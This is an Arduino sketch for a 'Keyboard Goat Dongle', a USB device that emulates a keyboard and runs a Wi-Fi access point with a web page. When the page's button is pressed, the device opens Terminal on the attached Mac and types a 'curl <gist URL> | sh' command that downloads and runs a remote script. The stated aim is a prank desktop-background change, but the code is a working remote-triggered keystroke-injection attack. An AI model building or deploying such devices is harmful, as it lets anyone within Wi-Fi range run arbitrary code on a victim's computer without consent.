#include <WiFiNINA.h>
#include <Keyboard.h>

char ssid[] = "Goat";
char pass[] = "imthegoat";

WiFiServer server(80);

const int APP_LAUNCH_DELAY = 1000;
const int SHORT_DELAY = 500;
const int TYPING_DELAY = 5;

void setup() {
  Serial.begin(9600);
  while (!Serial);

  Serial.println("Access Point Web Server Test");

  if (WiFi.status() == WL_NO_MODULE) {
    Serial.println("Communication with WiFi module failed!");
    while (true);
  }

  Serial.print("Creating access point named: ");
  Serial.println(ssid);
  int status = WiFi.beginAP(ssid, pass);
  if (status != WL_AP_LISTENING) {
    Serial.println("Creating access point failed");
    while (true);
  }

  delay(10000);
  server.begin();

  printWiFiStatus();

  Keyboard.begin();
  Serial.println("Keyboard initialized");
  Serial.println("Setup complete");
}

void loop() {
  WiFiClient client = server.available();
  if (client) {
    Serial.println("New client connected");
    String currentLine = "";
    bool changeBackground = false;
    unsigned long timeout = millis();

    while (client.connected() && millis() - timeout < 5000) {
      if (client.available()) {
        char c = client.read();
        Serial.write(c);
        if (c == '\n') {
          if (currentLine.length() == 0) {
            Serial.println("End of HTTP request");
            if (changeBackground) {
              Serial.println("Changing background");
              changeDesktopBackground();
              sendResponse(client, "Background changed successfully!");
            } else {
              Serial.println("Sending initial HTML response");
              sendHTMLResponse(client);
            }
            break;
          } else {
            if (currentLine.startsWith("GET /change-background")) {
              changeBackground = true;
              Serial.println("Change background request received");
            }
            currentLine = "";
          }
        } else if (c != '\r') {
          currentLine += c;
        }
        timeout = millis();
      }
    }

    // Close the connection
    client.stop();
    Serial.println("Client disconnected");
  }
}

void sendResponse(WiFiClient& client, String message) {
  Serial.println("Sending response: " + message);
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: text/html");
  client.println("Connection: close");
  client.println();
  client.println("<!DOCTYPE html><html lang='en'>");
  client.println("<head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>");
  client.println("<title>Keyboard Goat Dongle</title>");
  client.println("<style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background-color:#1a202c;color:white;}");
  client.println(".container{text-align:center;}");
  client.println("h1{color:#4299e1;}");
  client.println("form{margin-top:20px;}");
  client.println("input[type='submit']{background-color:#4299e1;color:white;border:none;padding:10px 20px;font-size:16px;cursor:pointer;border-radius:5px;}");
  client.println("input[type='submit']:hover{background-color:#3182ce;}");
  client.println("</style></head>");
  client.println("<body><div class='container'>");
  client.println("<h1>Keyboard 🐐 Dongle</h1>");
  client.println("<p>" + message + "</p>");
  client.println("<form action='/change-background' method='get'>");
  client.println("<input type='submit' value='Change Background'>");
  client.println("</form></div></body></html>");
  Serial.println("Response sent");
}

void sendHTMLResponse(WiFiClient& client) {
  sendResponse(client, "Click the button to change the desktop background:");
}

void printWiFiStatus() {
  Serial.print("SSID: ");
  Serial.println(WiFi.SSID());

  IPAddress ip = WiFi.localIP();
  Serial.print("IP Address: ");
  Serial.println(ip);

  Serial.print("To see the webpage, connect to the '");
  Serial.print(ssid);
  Serial.print("' network and visit http://");
  Serial.println(ip);
}

void changeDesktopBackground() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(APP_LAUNCH_DELAY);

  typeMessage("terminal");
  Keyboard.write(KEY_RETURN);
  delay(SHORT_DELAY);

  delay(APP_LAUNCH_DELAY);

  typeMessage("curl https://gist.githubusercontent.com/SjoenH/3facbd8f87bc25e421553b3b5eb00a6b/raw/931ca4786de0fa326e71458c20ce050baff6ca82/goat.sh | sh");
  Keyboard.write(KEY_RETURN);
  delay(SHORT_DELAY);
}

void typeMessage(String message) {
  for (int i = 0; i < message.length(); i++) {
    char c = message[i];
    switch (c) {
      case ':':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press('.');
        Keyboard.releaseAll();
        break;
      case '!':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press('1');
        Keyboard.releaseAll();
        break;
      case '-':
        Keyboard.press('-');
        Keyboard.releaseAll();
        break;
      case '/':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press('7');
        Keyboard.releaseAll();
        break;
      case ' ':
        Keyboard.press(' ');
        Keyboard.releaseAll();
        break;
      case '|':
        Keyboard.press(KEY_RIGHT_ALT);
        Keyboard.press('7');
        Keyboard.releaseAll();
        break;
      default:
        Keyboard.print(c);
        break;
    }
    delay(TYPING_DELAY);
  }
}